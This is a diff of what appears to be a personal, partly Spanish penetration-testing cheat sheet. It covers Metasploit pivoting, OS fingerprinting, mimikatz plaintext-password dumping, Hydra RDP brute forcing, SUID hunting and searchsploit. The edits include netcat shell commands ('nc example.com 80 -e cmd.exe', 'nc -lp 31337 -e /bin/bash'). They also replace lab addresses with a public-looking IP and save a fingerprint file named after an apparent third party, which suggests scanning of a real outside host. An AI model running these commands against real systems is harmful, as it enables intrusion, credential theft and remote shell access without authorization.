@@ -328,9 +328,11 @@ For simplicity, I only run the core commands.
     
     Web interface for metasploit
     
-    msfdb init
-    armitage
+    quick commands:
     
+        msfdb init
+        armitage
+
     https://localhost:5443/api/v1/auth/account
     
     https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml
@@ -339,7 +341,7 @@ For simplicity, I only run the core commands.
 
 # Exploitation and hacking of websites -> You have to see this again.
 
-    1) Burp Suite
+    1) Burp Suite -> 
 
     2) SQLInjection
 
@@ -567,7 +569,7 @@ For simplicity, I only run the core commands.
 
 # Use Fierce to brute DNS
 
-# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo...
+# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo. Pendiente!
 
     # http://ha.ckers.org/fierce/
     https://github.com/mschwager/fierce
@@ -618,6 +620,7 @@ For simplicity, I only run the core commands.
     ./httprint -h http://IP -s signatures.txt
     
     https://www.kali.org/tools/httprint/#httprint-1
+    
 # Scan with dirb
 
     Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt)
@@ -718,7 +721,15 @@ For simplicity, I only run the core commands.
     
 # Use Xprobe2 to identify the operating system fingerprint
 
-    xprobe2 -v -p tcp:80:open IP
+    A Remote active operating system fingerprinting tool.
+
+    sudo xprobe2  -v -r -p tcp:80:open 150.107.31.61
+
+    I can generate a signature.txt file, maybe you can use it with httprint.
+    
+    sudo xprobe2  -v -r  -F -o /home/kali/Desktop/signature-northernrich.txt  -p tcp:443:open -p tcp:80:open -B 150.107.31.61
+
+
     Enumeration of Samba
 
     nmblookup -A target
@@ -754,6 +765,7 @@ For simplicity, I only run the core commands.
 # Meterpreter port forwarding
 
     https://www.offensive-security.com/metasploit-unleashed/portfwd/
+    
 # Forward the remote port to the destination address
     meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
     kali > rdesktop 127.0.0.1:3389
@@ -778,8 +790,8 @@ Meterpreter VNC/RDP
     Gets the Windows plaintext user name password
 
     git clone https://github.com/gentilkiwi/mimikatz.git
-    privilege::debug
-    sekurlsa::logonPasswords full
+    mimikatz privilege::debug
+    mimikatz sekurlsa::logonPasswords full
 
 Gets a hash value
 
@@ -802,11 +814,12 @@ Gets a hash value
     meterpreter > shell
     
 # Use Hashcat to crack passwords    
+
     hashcat -m 400 -a 0 hash /root/rockyou.txt
     
 # Use the NC to fetch Banner information
 
-    nc 192.168.0.10 80
+    nc 150.107.31.61 80
     GET / HTTP/1.1
     Host: 192.168.0.10
     User-Agent: Mozilla/4.0
@@ -822,29 +835,35 @@ Gets a hash value
     c:>nc example.com 80 -e cmd.exe
     nc -lp 80
 
-nc -lp 31337 -e /bin/bash
-nc 192.168.0.10 31337
-nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+    nc -lp 31337 -e /bin/bash
+    nc 192.168.0.10 31337
+    nc -vv -r(random) -w(wait) 1 150.107.31.61 -z(i/o error) 1-1000
 
-Look for the SUID/SGID root file
+# Look for the SUID/SGID root file
 
 # Locate the SUID root file
-find / -user root -perm -4000 -print
+    
+    sudo find / -user root -perm -4000 -print
 
 # Locate the SGID root file:
-find / -group root -perm -2000 -print
+
+    sudo find / -group root -perm -2000 -print
 
 # Locate the SUID and SGID files:
-find / -perm -4000 -o -perm -2000 -print
+
+    sudo find / -perm -4000 -o -perm -2000 -print
 
 # Find files that do not belong to any user:
-find / -nouser -print
+
+    sudo find / -nouser -print
 
 # Locate a file that does not belong to any user group:
-find / -nogroup -print
+
+    sudo find / -nogroup -print
 
 # Find soft links and point to:
-find / -type l -ls
+
+    find / -type l -ls
 
 # Python shell
 
@@ -853,9 +872,11 @@ find / -type l -ls
 # Python \ Ruby \ PHP HTTP server
 
     python2 -m SimpleHTTPServer
+    # create a http server in that folder, port 8000 by default
     python3 -m http.server
-    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, 😀
-    ocumentRoot => Dir.pwd).start”
+    # create a http server in that folder, port 80
+    python3 -m http.server 80
+    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, DocumentRoot => Dir.pwd).start”
     php -S 0.0.0.0:8888
 
 # Gets the PID corresponding to the process
@@ -866,6 +887,8 @@ find / -type l -ls
 # Use Hydra to crack RDP
 
     hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
+    
+    xhydra is the gtk gui 
 
 # Mount the remote Windows shared folder
 
@@ -881,9 +904,12 @@ find / -type l -ls
     wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
     wine mingw-get-setup.exe
     select mingw32-base
-    cd /root/.wine/drive_c/windows
-    wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
-    cd /root/.wine/drive_c/MinGW/bin
+    Installation/ Apply changes
+    
+    cd /home/kali/.wine/drive_c/windows
+    
+    cd /home/kali/.wine/drive_c/MinGW/bin
+    
     wine gcc -o ability.exe /tmp/exploit.c -lwsock32
     wine ability.exe
 
@@ -912,6 +938,7 @@ find / -type l -ls
  
 
 # https://www.offensive-security.com/metasploit-unleashed/pivoting/
+
     meterpreter > ipconfig
     IP Address : 10.1.13.3
     meterpreter > run autoroute -s 10.1.13.0/24
@@ -926,12 +953,18 @@ find / -type l -ls
 
 # Exploit-DB based on CSV file
 
-    git clone https://github.com/offensive-security/exploit-database.git
-    cd exploit-database
-    ./searchsploit –u
-    ./searchsploit apache 2.2
-    ./searchsploit “Linux Kernel”
-
+    searchsploit –-update 
+    searchsploit apache 2.2
+    searchsploit “Linux Kernel”
+    # para bajar el sploit a tu hdd
+        searchsploit -m 
+    # para ver el sploit
+        searchsploit -x
+    
+    man searchsploit
+    
+    It is in kali!
+    
     cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3
 
 # MSF Payloads
